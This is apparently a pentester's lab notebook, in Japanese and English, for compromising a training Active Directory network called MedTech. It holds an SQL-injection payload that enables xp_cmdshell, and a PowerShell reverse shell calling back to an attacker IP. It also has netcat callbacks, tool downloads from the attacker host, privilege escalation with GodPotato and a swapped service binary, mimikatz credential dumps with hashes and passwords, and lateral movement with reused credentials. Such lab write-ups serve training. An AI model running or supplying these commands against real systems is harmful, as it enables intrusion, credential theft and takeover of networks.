121の80ポートが開いてるのでwebサイトを見る
loginフォームにSQLiがありそう

MSSQLのようなのでRCEを実行
input SQLi in username form
```
' EXECUTE sp_configure 'show advanced options', 1; ' RECONFIGURE; ' EXECUTE sp_configure 'xp_cmdshell', 1; ' RECONFIGURE; -- -
```
then get the revshell
```
' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.233'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
```

必要なものダウンロード
```
iwr -uri http://192.168.45.233:8000/nc64.exe -outfile nc.exe
iwr -uri http://192.168.45.233:8000/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
iwr -uri http://192.168.45.233:8000/agent.exe -outfile agent.exe
```

revshellがこれだけだと怖いので、何個か張っておく
```
Start-Process "C:\Tools\nc.exe" -ArgumentList "192.168.45.233 4445 -e cmd.exe"
```

printspooferを試す
```
.\PrintSpoofer.exe -i -c cmd
```

SeImpersonateが取れているので、GodPotatoをしてSYSTEM権限に昇格
```
.\GodPotato-NET4.exe -cmd "C:\Tools\nc.exe -e cmd.exe 192.168.45.233 4445"
```

proof.txtを発見
```
type C:\Users\Administrator\Desktop\proof.txt
```

mimikatzからjoeのクレデンシャル情報が取れる
```
.\mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::tickets" exit > mimikatz_result.txt
```

```
joe:Flowers1
```

ligolo-ngをセット
```
./agent.exe -connect 192.168.45.233:11601 -ignore-cert
```

AD enumeration
```
nxc smb ip.txt -u joe -p Flowers1 --continue-on-success
```

nxcからFILES02でローカル管理者でログイン可能なことを確認
```
172.16.229.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
172.16.229.10   445    DC01             [+] medtech.com\joe:Flowers1 
172.16.229.13   445    PROD01           [+] medtech.com\joe:Flowers1
172.16.229.12   445    DEV04            [+] medtech.com\joe:Flowers1 
```

ligolo経由でportscan

445につなげれることが分かったのでwinrmでつないでwindows enumerationを実施
```
evil-winrm -i 172.16.229.11 -u "joe" -p "Flowers1"
```

proof.txtとlocal.txtを取得
```
Get-ChildItem -Path C:\Users\ -Include *.ini, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```
type C:\Users\joe\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
```

found some credentials from C:\Users\joe\Documents\fileMonitorBackup.log
```
daisy:abf36048c1cf88f5603381c5128feb8e
toad:5be63a865b65349851c1f11a067a3068
wario:fdf36048c1cf88f5630381c5e38feb8e
goomba:8e9e1516818ce4e54247e71e71b5f436
```

crack for ntlm hashes
```
fdf36048c1cf88f5630381c5e38feb8e:Mushroom!
```

result for enumeration and password crack
```
wario:Mushroom!
```

lets enumerate with wario credential
```
sudo nxc smb ip.txt -u wario -p Mushroom! --continue-on-success
```

```
SMB         172.16.229.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.229.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.229.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.229.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.229.13   445    PROD01           [+] medtech.com\wario:Mushroom! 
SMB         172.16.229.10   445    DC01             [+] medtech.com\wario:Mushroom! 
SMB         172.16.229.12   445    DEV04            [+] medtech.com\wario:Mushroom! 
SMB         172.16.229.11   445    FILES02          [+] medtech.com\wario:Mushroom! 
```

windows enumeration
```
ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
    MEDTECH\Administrator
    MEDTECH\yoshi
    MEDTECH\wario
    MEDTECH\joe
    FILES02\Administrator
```

172.16.102.83にevil-winrmで入れた
```
evil-winrm -i 172.16.102.83 -u "wario" -p "Mushroom\!"
```

.83のlocal.txtを取得
```
type C:\Users\wario\Desktop\local.txt
```

winpeasでauditTrackerというサービスが脆弱であることが判明する

msfvenomでx64のペイロードを生成
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

moveでauditTracker.exeと入れ替えして、sc.exeでサービスをリスタートし権限昇格
```
move C:\DevelopmentExecutables\auditTracker.exe ./auditTracker.exe
move ./shell-x64.exe C:\DevelopmentExecutables\auditTracker.exe
sc.exe stop auditTracker
sc.exe start auditTracker
```

proof.txtを取得
```
type C:\Users\Administrator\Desktop\proof.txt
```

yoshiをusers.txtに入れてnxcでスキャン
```
sudo nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success
```

yoshi、wario、joeで.82に認証が通ることを確認し、３ユーザでrdp接続を試みるとyoshiでrdp可能
```
xfreerdp3 /u:yoshi /p:"Mushroom\!" /v:172.16.102.82
```

net user /domainを使用し、以下のユーザをゲット
```
peach
leon
mario
```

yoshiはローカル管理者のようなので、runasで権限昇格

proof.txtを取得
```
type C:\Users\Administrator\Desktop\proof.txt
```

hole.txtがある(多分ラビットホール)
```
leon:rabbit!:)
```

bloodhoundからleonがdomain adminsでDEV04にセッションがあることが分かる
DEV04に同様にnxcをかける
```
sudo nxc smb ip.txt -u users.txt -p passwords.txt --continue-on-success
```

yoshiでDEV04にrdp可能
```
xfreerdp3 /u:yoshi /p:"Mushroom\!" /v:172.16.102.12
```

desktopにlocal.txt

winpeasを実行すると、backup.exeが書き込み可能となっている


# DMZ
## 192.168.x.120
```
Open 192.168.236.120:22
Open 192.168.236.120:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkLNDFG9Ksbp5P6tGeMkTaAWEz2kRFfmnXuClhYdhdUw7F+b/usqfzszEQFdRP3R3vpy3LnLrkDmaMuIAL/lazj55FsrhC3cnbNgNCEzapQNf0ZpAydfT4ypFiSrqLDE0Bq+xZmAT9S8eZ2efR5sfCPw9NB/hMlmW6s91xekPtBbINNhgPy8beAvkyfSlGMWj8kHKqP6onEoo+J5IkOjMcnXh+zLdxoPdo6HnuQ/VMims8qYEaxxJndN1Y46jEMdBtznbUavHrD8NIbviVFUBIfHyUEs5kWp1LK1TMSGBA9ILxGumIJRXdIV3OouR+KLlva+DxJdri9pSZ4g5TVP7iutPogBm8U7h14MfXt+jhT+NC8xRZi/30zQOtHmV+nsKzhbCmveRed3UZvcLE+t5nYuo8+EV1vqaRtvhds188FbDif1AI9ISdytjPaOomUEcRg63jUuc32iokqFLNcYba7339M8Q18HzneLXj7NGo+/avQ4D/zZVXSDki9BT+Hhs=
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1H0xp5zQUrhCWusjcxvbE4BrHOhMzFjCtti37V8JXBwBvi6uM7mmuwfkTr5eImaQsg+Py3ZA4rejeFoVgIITE=
|   256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILG7AuVkWzcrlnj9+BnFPawjXQbi/iHkE80UL/RPXFUf
80/tcp open  http    syn-ack ttl 61 WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/4%OT=22%CT=%CU=40971%PV=Y%DS=4%DC=T%G=N%TM=6890AEE1%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11N
OS:W7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## 192.168.x.121
### rustscan
```
Open 192.168.236.121:80
Open 192.168.236.121:135
Open 192.168.236.121:139
Open 192.168.236.121:445
Open 192.168.236.121:5985
Open 192.168.236.121:47001
Open 192.168.236.121:49664
Open 192.168.236.121:49665
Open 192.168.236.121:49666
Open 192.168.236.121:49667
Open 192.168.236.121:49668
Open 192.168.236.121:49669
Open 192.168.236.121:49670
Open 192.168.236.121:49671

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MedTech
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (94%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1607 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 (89%), Microsoft Windows Server 2016 or Server 2019 (89%), Microsoft Windows Server 2012 (88%), Microsoft Windows 10 1703 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/4%OT=80%CT=%CU=42375%PV=Y%DS=4%DC=T%G=N%TM=6890AF2A%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=A)
SEQ(SP=FA%GCD=1%ISR=111%TI=I%CI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=N)
```

### mimikatz
```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

628    {0;000003e7} 1 D 41607        NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 2590883     NT AUTHORITY\SYSTEM   S-1-5-18  (11g,08p)   Primary
 * Thread Token  : {0;000003e7} 1 D 2639139     NT AUTHORITY\SYSTEM   S-1-5-18  (04g,21p)   Impersonation (Delegation)

mimikatz(commandline) # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 1111014 (00000000:0010f3e6)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 8/6/2025 4:21:22 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 753961 (00000000:000b8129)
Session           : Batch from 0
User Name         : Administrator
Domain            : WEB02
Logon Server      : WEB02
Logon Time        : 4/8/2024 12:09:09 PM
SID               : S-1-5-21-1364059446-3280107051-2039649012-500
 msv :
  [00000003] Primary
  * Username : Administrator
  * Domain   : WEB02
  * NTLM     : b2c03054c306ac8fc5f9d188710b0168
  * SHA1     : 14260fbb8c532d874a11696bcb3ee176120c0875
 tspkg :
 wdigest :
  * Username : Administrator
  * Domain   : WEB02
  * Password : (null)
 kerberos :
  * Username : Administrator
  * Domain   : WEB02
  * Password : (null)
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 283887 (00000000:000454ef)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:06:58 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
 msv :
  [00000003] Primary
  * Username : joe
  * Domain   : MEDTECH
  * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
  * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
  * DPAPI    : 58de53296298ce0f98087ae902c88735
 tspkg :
 wdigest :
  * Username : joe
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : joe
  * Domain   : MEDTECH.COM
  * Password : Flowers1
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 122048 (00000000:0001dcc0)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:46 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 121422 (00000000:0001da4e)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:46 PM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 80038 (00000000:000138a6)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-90-0-1
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : b6191454048eb6ea7bb3058ed8c088f2
  * SHA1     : b6813ae6c2316b049456dc02ce0122bd62438a5c
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : ad 90 b4 19 89 a2 4d a1 d8 76 a9 cd 8c 3c 0d e8 ed 94 3d f6 80 2d 1c 6c af 70 65 28 20 75 29 6c 35 dd ae 7f 24 67 f3 c3 1e b2 c8 39 f4 35 a4 8c 39 3a 5b 3f 4f 86 6c 36 34 df f7 d5 4f ba 8c 5d 96 56 10 20 a2 46 69 70 3b 17 73 e9 d0 6f 18 b4 db 31 6d 88 f6 be ca 4b 8b a8 4e b9 b9 b9 05 6e b7 5f be 69 58 63 58 bb 3f 1a 86 33 ec cb 74 da 05 c5 31 aa 26 bf cd 51 7e a4 2c 44 f7 18 eb 16 ba 36 db 3d d3 89 36 46 04 c7 a7 9e f7 bc 28 5a 7c 99 f3 8a da c1 6b af bb ef ea a5 71 30 1a 3d 35 6b eb 44 da d4 58 7b b9 59 4b 42 7b f1 93 7b 04 92 f3 30 9e 12 f8 fe ec fd 8b f5 ca 06 a7 ce f6 6f 85 80 33 dc 92 95 1b 6d ca 5d ea df 7b 86 50 a6 f1 e1 92 4e d4 5c 2f f0 e9 f1 71 79 eb 56 64 2a ca 05 89 aa d3 25 84 1f 17 d1 57 ab 0b 16 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 80006 (00000000:00013886)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-90-0-1
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-20
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : web02$
  * Domain   : MEDTECH.COM
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 681881 (00000000:000a6799)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 4/8/2024 12:08:59 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
 msv :
  [00000003] Primary
  * Username : WEB02$
  * Domain   : MEDTECH
  * NTLM     : 40a78a0bbf7fb3f1b7af31ae61e401c8
  * SHA1     : aa174c43d5553834eacc9a3d77a9b0134a1ba098
 tspkg :
 wdigest :
  * Username : WEB02$
  * Domain   : MEDTECH
  * Password : (null)
 kerberos :
  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 
 ssp :
 credman :
 cloudap :

Authentication Id : 0 ; 331740 (00000000:00050fdc)
Session           : Interactive from 1
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 4/8/2024 12:07:00 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
 msv :
  [00000003] Primary
  * Username : joe
  * Domain   : MEDTECH
  * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
  * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
